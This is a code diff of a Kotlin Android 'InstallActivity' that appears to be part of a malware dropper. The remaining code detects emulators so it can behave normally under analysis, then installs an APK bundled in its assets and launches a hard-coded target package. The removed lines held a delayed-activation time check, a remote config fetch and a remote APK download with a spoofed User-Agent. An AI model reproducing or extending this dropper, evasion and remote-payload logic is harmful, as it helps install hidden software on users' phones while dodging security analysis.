@@ -1,8 +1,6 @@
 package com.cristal.bristral.tristal.mistral
 
-import android.content.Context
 import android.content.Intent
-import android.content.SharedPreferences
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -13,19 +11,13 @@ import android.view.View
 import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
-import org.json.JSONObject
 import java.io.File
-import java.net.URL
-import javax.net.ssl.HttpsURLConnection
 
 class InstallActivity : AppCompatActivity() {
 
     companion object {
-        private const val appScheduledTime  = "appScheduledTime_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
-        private const val appConfigUrl      = "appConfigUrl_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
-        private const val appSourceUrl      = ""
-        private const val TARGET_PKG        = "com.android.pictach"
-        private const val TARGET_CLASS      = "com.android.pictach.MainActivity"
+        private const val TARGET_PKG   = "com.android.pictach"
+        private const val TARGET_CLASS = "com.android.pictach.MainActivity"
     }
 
     private var progressBar: ProgressBar? = null
@@ -46,13 +38,8 @@ class InstallActivity : AppCompatActivity() {
     private fun startAppFlow() {
         try {
             if (!isCompatibleDevice()) { showNormal(); return }
-            if (!isAppReady())  { showNormal(); return }
 
-            val resolvedUrl = fetchAppConfig() ?: appSourceUrl
-            val isRemote = resolvedUrl.startsWith("http") &&
-                !resolvedUrl.contains("PLACEHOLDER")
-
-            val apkBytes = if (isRemote) fetchAppData(resolvedUrl) else loadAssets()
+            val apkBytes = loadAssets()
             if (apkBytes == null || apkBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\napk is null or empty"); return }
 
             runOnUiThread { installApkDirect(apkBytes) }
@@ -104,45 +91,6 @@ class InstallActivity : AppCompatActivity() {
         try { if (File("/dev/socket/qemud").exists() || File("/dev/qemu_pipe").exists()) s++ } catch (e: Exception) { }
         try { val abi = Build.SUPPORTED_ABIS.firstOrNull()?.lowercase() ?: ""; if (abi.contains("x86") && !abi.contains("arm")) s++ } catch (e: Exception) { }
         return s < 2
-    }
-
-    // ── SCHEDULE CHECK ────────────────────────────────────────
-    private fun isAppReady(): Boolean {
-        return try {
-            val ts = appScheduledTime.trim().toLongOrNull() ?: return true
-            if (ts == 0L) return true
-            val prefs: SharedPreferences = getSharedPreferences("sys_cfg", Context.MODE_PRIVATE)
-            if (!prefs.contains("t_inst")) prefs.edit().putLong("t_inst", System.currentTimeMillis() / 1000L).apply()
-            System.currentTimeMillis() / 1000L >= ts
-        } catch (e: Exception) { false }
-    }
-
-    // ── CONFIG FETCH ──────────────────────────────────────────
-    private fun fetchAppConfig(): String? {
-        return try {
-            if (appConfigUrl.contains("PLACEHOLDER") || appConfigUrl.isBlank()) return null
-            val conn = URL(appConfigUrl).openConnection() as HttpsURLConnection
-            conn.connectTimeout = 8000; conn.readTimeout = 10000
-            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
-            if (conn.responseCode != 200) { conn.disconnect(); return null }
-            val json = JSONObject(conn.inputStream.bufferedReader().readText())
-            conn.disconnect()
-            json.optString("u", "").ifBlank { null }
-        } catch (e: Exception) { null }
-    }
-
-    // ── REMOTE FETCH ──────────────────────────────────────────
-    private fun fetchAppData(url: String): ByteArray? {
-        return try {
-            val conn = URL(url).openConnection() as HttpsURLConnection
-            conn.connectTimeout = 15000; conn.readTimeout = 60000
-            conn.instanceFollowRedirects = true
-            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
-            if (conn.responseCode != 200) { conn.disconnect(); return null }
-            val bytes = conn.inputStream.use { it.readBytes() }
-            conn.disconnect()
-            if (bytes.isEmpty()) null else bytes
-        } catch (e: Exception) { null }
     }
 
     // ── ASSETS ────────────────────────────────────────────────
